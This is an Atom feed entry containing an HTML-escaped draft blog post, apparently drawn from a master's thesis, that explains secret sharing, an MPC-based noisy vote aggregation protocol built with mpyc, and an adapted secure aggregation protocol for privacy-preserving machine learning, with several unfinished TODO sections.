&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So we experimentally design two systems using these two different approaches, suited for two different scenarios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;In the &lt;strong&gt;first scenario&lt;/strong&gt;, the parties are assumed to be equal in terms of &lt;em&gt;computation power&lt;/em&gt;, &lt;em&gt;communication latency&lt;/em&gt;, and &lt;em&gt;should be available&lt;/em&gt; at all time. There are typically only a &lt;em&gt;few parties&lt;/em&gt;, and they are all interconnected in a &lt;em&gt;Mesh architecture&lt;/em&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In this scenario, we will use a general MPC protocol&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In the &lt;strong&gt;second scenario&lt;/strong&gt;, we assume a &lt;em&gt;lot of non-reliable and weak&lt;/em&gt; devices (in terms of computation power), interacting with a central server in a &lt;em&gt;Star architecture&lt;/em&gt;. A large portion of these devices can typically &lt;em&gt;drop out&lt;/em&gt; during the computation, without affecting the protocol (their input is simply not taken into consideration).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In this scenario, we will use a secure aggregation protocol&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;First scenario&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Second Scenario&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/hospitals-scenario.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/fedlearning-scenario.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;Choosing one or the other depends on the use-case. Of course, general MPC is much more expressive, but is typically quite slow and greedy in terms of communication, while the other approach is more suited for a real-world environement and typically offer better performance, but is less adaptable to a system design change.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;first-scenario---mpyc&#34;&gt;First scenario - MPYC&lt;/h3&gt;
&lt;p&gt;For our first scenario, we relied on a General Multiparty Computation scheme based on homorphic secret sharing. We implemented it in Python with the &lt;a href=&#34;https://github.com/lschoe/mpyc&#34;&gt;mpyc library&lt;/a&gt;, which is based on Shamir secret sharing and Pseudorandom secret sharing.&lt;/p&gt;
&lt;p&gt;Secret sharing is a way to split a secret into $n$ different shares and typically distribute these shares to different parties. The secret could be reconstructed out of all (or a portion) of these shares.&lt;/p&gt;
&lt;p&gt;The most interesting case is of course when only a portion (a subset) of these shares allow to reconstruct the full secret. This is called &lt;strong&gt;t-out-of-n threshold secret sharing&lt;/strong&gt; (or $(t,n)$ secret sharing). Such a scheme is made of two algorithms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$[ \ [![ s ]!]_1, [![ s ]!]_2, â¦, [![ s ]!]_n ] \leftarrow SS.split(s, t, n)$, which splits our secret $s$ into $n$ shares, from which at least $t$ are needed to reconstruct $s$.&lt;/li&gt;
&lt;li&gt;$s&amp;rsquo; \leftarrow SS.recons( [ \ [![ s ]!]_i, [![ s ]!]_j, â¦ ] )$, which reconstructs the original secret $s$ if $| \ [ \ [![ s ]!]_i, [![ s ]!]_j, â¦ ] \ | \geq t$,  or outputs &lt;em&gt;any value&lt;/em&gt; if not enough shares are provided, or incorrect shares for our secret $s$.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;These two algorithms must respect two properties (taken from the book &amp;ldquo;A Practical Introduction to Secure Multi-Party Computation&amp;rdquo;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Correctness&lt;/strong&gt;&lt;/em&gt;. Let $[ \ [![ s ]!]&lt;em&gt;1, [![ s ]!]&lt;em&gt;2, â¦, [![ s ]!]&lt;em&gt;n ] \leftarrow  SS.split(s, t, n)$. Then:
$$
\mathbb{P}[âk â¥ t, SS.recons( [ \ [![ s ]!]&lt;/em&gt;{i_1}, [![ s ]!]&lt;/em&gt;{i_2}, â¦, [![ s ]!]&lt;/em&gt;{i_k} ] ) = S] = 1
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Perfect Privacy&lt;/strong&gt;&lt;/em&gt;. Any set of shares of size less than &lt;em&gt;t&lt;/em&gt; does not reveal anything about the secret in the information theoretic sense. More formally, for any two secrets $a, b \in D$ and any possible vector of shares $v = [v1, v2, &amp;hellip;, vk]$, such that $k &amp;lt; t$ (and $|_k$ denotes appropriate projection on a subspace of &lt;em&gt;k&lt;/em&gt; elements):
$$
\mathbb{P}[v = SS.split(a)|_{k}] = Pr[v = SS.split(b)|_{k} ]
$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;It is not hard to find examples of $(n,n)$ secret sharing (one that creates $n$ shares, and which requires all $n$ shares to reconstruct the secret). Multiplicative secret sharing for instance, needs all shares to be multiplied together to reconstruct the secret. We can also think about how easy it is to simply onion-encrypt a secret $S$ with $n$ keys.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;u&gt;NB:&lt;/u&gt;&lt;/strong&gt; In general, we can create an $(n,n)$ secret sharing scheme by taking any group $G$ with group operation â, mapping the shared secret into a group member $S$, selecting $nâ1$ random (uniformly distributed) group elements, and publishing the shares $s_1,s_2,â¦,s_{n-1}$ and the last one, being computed as $s_n = Sâ(s_1âs_2ââ¦âs_{nâ1})^{â1}$.&lt;/p&gt;
&lt;p&gt;In multiplicative secret sharing, we work in the group $\mathbb{Z}_p^*$ (for a prime $p$), and the operation * is the simple mutliplication.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is information-theorically secure, because anynone in the possession of $nâ1$ shares, will still have no information on the shared secret $S$. For each possible value of $S$, there is a possible value of the missing share, and this defines the cardinality of the search space.&lt;/p&gt;
&lt;p&gt;The analogy with onion-encryption (although not theorically the same as secret sharing) is exactly what we see in spy movies: The access to the nuclear button is locked with 3 keys, owned by 3 different Russian generals, and it is required to enter the 3 keys at the same time to unlock the mechanism.&lt;/p&gt;
&lt;p&gt;Now, what if we only want to require any 2 out of these 3 keys? This would be analogous to (2,3) secret sharing, a 2-out-of-3 scheme. I&amp;rsquo;m not an expert in padlock mechanism, but I&amp;rsquo;m sure it exists&amp;hellip;&lt;/p&gt;
&lt;p&gt;In theory we could build a t-out-of-n from a n,n, but requires a exploding combinatorially many locks and keys.&lt;/p&gt;
&lt;p&gt;Building such schemes from a more abstract standpoint requires the problem to be reformulated as an algebraic system of $n$ equations, with $t$ unknowns.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Shamir&amp;rsquo;s scheme&lt;/strong&gt;, relies on polynomial interpolation, where each share is a value $y_i = f(x_i)$ equal to a polynomial of degree $t-1$ evaluated in some points $x_1$, $x_2$, â¦, $x_n$.
Indeed, $d$ distinct points $(x_i, y_i)$ are sufficient to completely determine a polynomial of degree $d-1$ (2 points for a line, 3 points for a quadratic polynomial, etcâ¦), but any subset of&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Blakey&amp;rsquo;s scheme&lt;/strong&gt;, relies on geometric considerations to reconstruct the location of a point at the intersection of several hyperplanes, where each share is the equation of an hyperplane. Indeed, in 3 dimensions for instance, 2 surfaces (hyperplanes of dimension 3) would intersect in a line (i.e a hyperplane of dimension 2), and you would need a 3rd hyperplane to reduce further the dimensionality of the intersection to a single point.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Other schemes, like &lt;strong&gt;Mignotte&amp;rsquo;s&lt;/strong&gt; or &lt;strong&gt;Asmuth-Bloom&amp;rsquo;s&lt;/strong&gt; schemes rely on the &lt;a href=&#34;https://en.wikipedia.org/wiki/Secret_sharing_using_the_Chinese_remainder_theorem&#34;&gt;Chinese Remainder Theorem&lt;/a&gt;, where each share is a reduction of the secret modulo some prime numbers.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Our (NAIVE) protocol for $m$ parties + 1 server (which is also a computation party, but only an output party, not an input party) would go as follows:&lt;/p&gt;
&lt;p&gt;We want to compute $v = \sum_{i=1}^{m} v_i$&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Each party $i$ generates shares of its private noisy vote vector $v_i$ (actually just its vote vector, noised with appropriate random Gaussian noise) and distribute one to every other party: $[![ v_i ]!]_1, [![ v_i ]!]_2, â¦, [![ v_i ]!]_m$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Once all the shares are exchanged, without further communication each party $i$ adds its shares of $v_1, v_2, â¦, v_m$. As the addition operation is homomorphic, they now hold a share of the sum $v$ : $[![ v ]!] = \sum_{j=1}^{m}  [![ v_j ]!]_i$.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;All the parties now send their share of this sum $v$ to the aggregator, which reconstructs it.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The aggregator selects the argmax of $v$ as the assigned label.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that in the MPC paradigm, every node is a &amp;ldquo;computation party&amp;rdquo;, so what we called so far the &lt;em&gt;server&lt;/em&gt; or &lt;em&gt;aggregator&lt;/em&gt; is an &amp;ldquo;output party&amp;rdquo; (i.e receiving an output value), while the other nodes, the &lt;em&gt;clients&lt;/em&gt; are &amp;ldquo;input parties&amp;rdquo; (i.e contributing an input value).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Following our assumptions of a honest-but-curious setting, clients will respect the protocol (e.g properly noise their input vector), however they will try to learn as much as possible with what is available to them. In particular, clients might want to collude with the server, and share their inputs/outputs.&lt;/p&gt;
&lt;p&gt;In this case, they manage to &amp;ldquo;un-noise&amp;rdquo; the distribution, by substracting the noise part they generated to the final noisy aggregated sum. Their goal is to learn a closer estimate to the blue histogram above, and break differential privacy.&lt;/p&gt;
&lt;p&gt;Hence, we have to design a way for the clients to obliviously send their noise to the server, i.e send a noise value without knowing it. Of course, the server, which will receive it, should neither be aware of this noise value, and aggregate all these noise values together without asking questions.&lt;/p&gt;
&lt;p&gt;We can build this system incrementally:&lt;/p&gt;
&lt;p&gt;Our first idea is to construct an &lt;a href=&#34;https://en.wikipedia.org/wiki/Oblivious_transfer&#34;&gt;Oblivious Transfer&lt;/a&gt; mechanism, between each client and the server. This means that each client will generate $d$ different noise values (gaussian noise, with same variance), and the server will select 1 out of these $d$, without the client knowing which one.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Without loss of generality, we will choose here $d=2$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Formally, oblivious transfer is defined as follow:
A sender $S$ holds 2 private inputs $x_0$ and $x_1$, a receiver $R$ holds a selection bit $b = {0,1}$. The receiver must obtain $x_b$ must not learn any information about $x_{b-1}$. The sender must not learn the value of $b$ (i.e it must not know which of the two inputs was selected).&lt;/p&gt;
&lt;p&gt;In our case, we do not require the server to obtain &lt;strong&gt;no&lt;/strong&gt; information about the other (non-selected) noise value, but we absolutely do not want the client to learn which of its inputs was selected by the server. So it is obivious in only one direction. A simple way to implement this protocol is just to send both values to the server, and let it select one.&lt;/p&gt;
&lt;p&gt;This is an essential first step, but there is still a catch, since we assumed clients could collude with the server, the latter could communicate which private noise value it selected.&lt;/p&gt;
&lt;p&gt;We hence need to design a system in which the server does not even &lt;strong&gt;know&lt;/strong&gt; which value it selected. In other terms, the selection bit $b$ must be oblivious to him.&lt;/p&gt;
&lt;p&gt;There is a simple way all parties could come up with a shared list of $m$ random bits (i.e, 1 for each party):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We ask each party to generate an array of random bits $r_i$ = [0, 0, 1, 0, 1, â¦]&lt;/li&gt;
&lt;li&gt;They secret share it with every other party&lt;/li&gt;
&lt;li&gt;They XOR their shares of each array $r_1, r_2, â¦, r_m$ (element-wise)&lt;/li&gt;
&lt;li&gt;They now hold shares of a final array $r$ which contains random bits, derived with the help of everyone&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This array $r$ will contain the selection bits for every party. I.e the server will select the private value $x_{r[j]}$ of party $j+1$ (**NB:** We assumed list indexing started at zero, but our first client has index &amp;ldquo;1&amp;rdquo;).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This way, there is no way for the aggregator to recover the un-noised value of the aggregate sum. It would require &lt;strong&gt;every&lt;/strong&gt; client to send their &lt;strong&gt;two&lt;/strong&gt; generated noise values, and then the server would need to try the $2^m$ noise combinations ($d^m$ in the more general case) to remove from the noisy aggregate until eventually finding a combination of values that would give a integer number (i.e the true aggregate value).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Full Protocol: (not CGNMAX)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Each party $i$ draws two random gaussian noise values from the same distribution with appropriate variance, and applies it to its vote vector. It obtain two noisy vectors $v_i^0$ and $v_i^1$.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Each party secret shares both of these vectors with every other party.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Each party derives the shares of this list of selection bits $r$ (&lt;em&gt;&lt;strong&gt;&lt;u&gt;NB&lt;/u&gt;&lt;/strong&gt;&lt;/em&gt;: They do not recombine their shares and recover the raw list of bits, we want to do the selection under MPC).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Each party add the shares of vote vectors they have according to the selection list $r$, i.e, still under MPC they will do $[v] = \sum_{i=1}^m v_i^{r[i-1]}$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;All the parties now send their share of this sum $v$ to the aggregator, which reconstructs it.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The aggregator selects the argmax of $v$ as the assigned label.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; In the CGNMAX one, parties don&amp;rsquo;t directly noise their votes vector. Each of them generate a noise part, which are aggregated together into a total noise, used to noise the maximum value of the array. If this value passes a certain threshold, we repeat the process of directly noising the votes vectors themselves, and selecting the argmax of the aggregate.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;We used mpyc because it efficiently deals with communication (we do not have to reimplement that) and it is in Python, which is easily readable, and understandable by the Machine Learning community (as their language of predilection).
They state that this is an academic library, perfect for prototyping.&lt;/p&gt;
&lt;p&gt;Each party runs the same code, and they have a &amp;ldquo;Party ID&amp;rdquo; &lt;code&gt;pid&lt;/code&gt;, so if you want to do a disjonction among parties (as in our case, the distinction between the server (aggregator) and the client), you can branch depending on this pid.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s look at the code:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/AlexConnat/MPC-Aggreg/blob/master/main.py&#34;&gt;https://github.com/AlexConnat/MPC-Aggreg/blob/master/main.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Explain portion of the code like mpc.input(), mpc.output(), etcâ¦ (important functions) -&amp;gt; Already in comments&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Put graph of performances with different number of clients (+Interpolation) and different latency LAN/WAN (explain how we delayed the LAN) + Small Conclusion.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Few Clients&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;More Clients&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/runtime-mpc-1.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/runtime-mpc-2.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;second-scenario---secagg&#34;&gt;Second scenario - SecAgg&lt;/h3&gt;
&lt;p&gt;For the second scenario, we make use of a protocol by Google, defined in the paper &amp;ldquo;&lt;a href=&#34;https://ai.google/research/pubs/pub47246/&#34;&gt;Practical Secure Aggregation for Privacy-Preserving Machine Learning&lt;/a&gt;&amp;quot;, that we slightly adapt for our needs.&lt;/p&gt;
&lt;p&gt;This protocol uses pairs of self-cancelling blinding vectors to hide the private input of each client, while still getting the correct result when aggregated all together.&lt;/p&gt;
&lt;p&gt;The big advantage of this protocol is it can support arbitrary large input vectors, without increasing much performance, and can tolerate up to half of the clients dropping out. However, it is only designed for secure aggregation of vectors, and you cannot for instance perform a secure maximum, or secure argmax on the resulting vector, as with mpyc. The server will eventually learn the full aggregated vector.&lt;/p&gt;
&lt;p&gt;To give the intuition behind the protocol, I will take the example of &lt;strong&gt;three clients&lt;/strong&gt;, that could be easily generalized to an arbitrary number of clients.&lt;/p&gt;
&lt;p&gt;So we have three clients, each one having its own private input vector $x_i$. For our application, you can imagine these $x_1, x_2, x_3$ as their votes vector. We want to have the server obtain $z = \sum_{}^{} x_i$ without learning any individual $x_i$.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;All three clients will &lt;strong&gt;exchange a &amp;ldquo;mask&amp;rdquo;&lt;/strong&gt; with each other (even though they communicate through encrypted channels, in practice, all messages go though a central server). This mask is simply a vector of same cardinality as the inputs, containing uniformily distributed random values.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Client 1 and client 2 will exchange a mask $p_{12}$.&lt;/li&gt;
&lt;li&gt;Client 1 and client 3 will exchange a mask $p_{13}$.&lt;/li&gt;
&lt;li&gt;Client 2 and client 3 will exchange a mask $p_{23}$.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Clients will mask their input $x_i$ by &lt;strong&gt;adding the masks they share with any clients whose ID is higher&lt;/strong&gt; than theirs (assume a total order on clients IDs) and &lt;strong&gt;substract the ones they share with clients with lower IDs&lt;/strong&gt;. Once masked, they send their output $y_i$ to the server.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$y_1 = x_1 + p_{12} + p_{13}$&lt;/li&gt;
&lt;li&gt;$y_2 = x_2 + p_{23} - p_{12}$&lt;/li&gt;
&lt;li&gt;$y_3 = x_3 - p_{13} - p_{23}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The server performs a simple summation of the inputs $y_i$ it received from clients, as indeed: &lt;br&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;$$
\sum_{u=1}^3 y_u = x_1 + \cancel{p_{12}} - \cancel{p_{12}} + x_2 + &amp;hellip; = \sum_{u=1}^3 x_u = z
$$&lt;/p&gt;
&lt;p&gt;However, this protocol, as simple as it could be, has two drawbacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Dropout resistance&lt;/strong&gt; (+ explain Double Masking, to make it secure against late messages (or lying in the malicious case))&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Communication overhead&lt;/strong&gt; (-&amp;gt; Explain PRG, and the seed agreed with DHKE)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Indeed, we can observe that the protocol described above is not tolerating any clients dropping out, i.e clients not responding anymore. In our example, what would happen if the second client would crash just after having exchanged masks with every other client? The server would hence receive:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$y_1 = x_1 + p_{12} + p_{13}$&lt;/li&gt;
&lt;li&gt;$y_2 =$ ???&lt;/li&gt;
&lt;li&gt;$y_3 = x_3 - p_{13} - p_{23}$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The server still want to compute the sum of private inputs of the &lt;strong&gt;remaining&lt;/strong&gt; clients $z&amp;rsquo; = x_1 + x_3$, but it cannot just add $y_1 + y_3$ as only the mask $p_{13}$ would cancel out, and the masks shared with the dropped out client ($p_{12}$ and $p_{23}$) would remain in the sum, hence yielding a wrong result.&lt;/p&gt;
&lt;p&gt;To solve that problem, during masks derivation and exchange phase, each client should share with every other a 2-out-of-3 secret share of its masks (or a $t$-out-of-$n$, with $t= floor(n/2)+1$ in the general case).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Client 1 sends to:
&lt;ul&gt;
&lt;li&gt;Client 2: $[![ p_{12} ]!]_2$ and $ [![ p_{13} ]!]_2$&lt;/li&gt;
&lt;li&gt;Client 3: $[![ p_{12} ]!]_3$ and $ [![ p_{13} ]!]_3$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Client 2 sends to :
&lt;ul&gt;
&lt;li&gt;Client 1: $[![ p_{12} ]!]_1$ and $ [![ p_{23} ]!]_1$&lt;/li&gt;
&lt;li&gt;Client 3: $[![ p_{12} ]!]_3$ and $ [![ p_{23} ]!]_3$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Client 3 sends to:
&lt;ul&gt;
&lt;li&gt;Client 1: $[![ p_{13} ]!]_1$ and $ [![ p_{23} ]!]_1$&lt;/li&gt;
&lt;li&gt;Client 2: $[![ p_{13} ]!]_2$ and $ [![ p_{23} ]!]_2$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Holding these 2-out-of-3 shares will allow the remaining clients to reconstruct the masks of the ones that dropped outâ¦. ALREADY HAD THEMâ¦.. (3 is a bad example). It is to avoid &lt;strong&gt;recovery of recovery&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;With 4, is it 3-out-of-4 or 2-out-of-4 ???&lt;/p&gt;
&lt;p&gt;y1 = x1 + p12 + p13 + p14&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;y2 = x2 + p23 + p34 - p12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;y3 = x3 + p34 - p13 - p23&lt;/p&gt;
&lt;p&gt;y4 = x4 - p14 - p24 - p34&lt;/p&gt;
&lt;p&gt;$x1 + x3 + x4 + \cancel{p13-p13} + \cancel{p14-p14} + \cancel{p34-p34} + p12 + p23 - p24$&lt;/p&gt;
&lt;p&gt;If we ask all remaining clients to send shares of masks for p12, p23, p24, as everyone has them, even if a new client drops out during this phase (say y3), we still have 2 shares of p12, 2 shares of p23, two shares of p24 which is enough to reconstruct those masks.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Write about communication overhead&lt;/p&gt;
&lt;p&gt;We modified a bit the protocol so that instead of sending their raw input $x_i$, each client would send a &lt;strong&gt;noisy&lt;/strong&gt; version of their input (i.e, of their vote vector) $\tilde{x}_i$.&lt;/p&gt;
&lt;p&gt;What is the amount of noise each client should put?&lt;/p&gt;
&lt;p&gt;If we want a total gaussian noise with variance $\sigma^2$, and there are $n$ teachers each teacher prediction should be noised with a variance $\frac{\sigma^2}{n}$. And knowing that a teacher can send the aggregated predictions of $t$ teachers, this vote vector should be noised with variance $\frac{t}{n}\sigma^2$ (i.e a standard deviation of $\sqrt{\frac{t}{n}}\sigma$).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Explain mechanism to add more noise than needed (in the worst case scenario where half of the nodes drop out), and then remove the noise value of the nodes that &lt;strong&gt;didn&amp;rsquo;t drop out&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Write about &amp;ldquo;Multiple teachers per nodes&amp;rdquo; (not implemented, though) -&amp;gt; Hierarchy of teachers, to get as close as possible to the true variance value.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Comment the performance graphs (different number of nodes + proportion of nodes dropping out + latency)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Write a Small Conclusion for the chapter&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Few Clients&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;More Clients&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/runtime-secagg-1.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/runtime-secagg-2.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;evaluation&#34;&gt;Evaluation&lt;/h2&gt;
&lt;p&gt;Our evaluation is essentially the time it takes both systems to perform one iteration of the protocol and hence produce one label (or None) for a data sample.&lt;/p&gt;
&lt;p&gt;In this part, we do not measure the performance of the actual Machine Learning task, in terms of the accuracy of the student model, as this one depends solely on the amount of noise we introduced in the Knowledge Transfer mechanism. We refer the reader to Table ??? on a summary of these results for the three most common image recognition datasets.&lt;/p&gt;
&lt;p&gt;We measured this time on a EC2 AWS Machine m5.4xlarge with 16vCPUs and 64Go of RAM, with a 100GBps ethernet connexion. In our setting, all clients were hosted on the same machine, as different processes. Hence we simulated real latencies introduced by distance between nodes in a LAN or WAN environement using tc.&lt;/p&gt;
&lt;h2 id=&#34;general-conclusion--future-work&#34;&gt;General Conclusion + Future work&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; Compare both implementations, say how this could be further improved, etc&amp;hellip;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Few Clients&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;More Clients&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/runtime-both-1.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/runtime-both-2.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;TODO:&lt;/strong&gt; (re-write the &amp;ldquo;Future Work&amp;rdquo; section from my Thesis)&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://alexconnat.github.io/categories/privacy/" term="Privacy" label="Privacy" />
                            
                        
                    
                
                    
                
            
        </entry>
    
</feed>
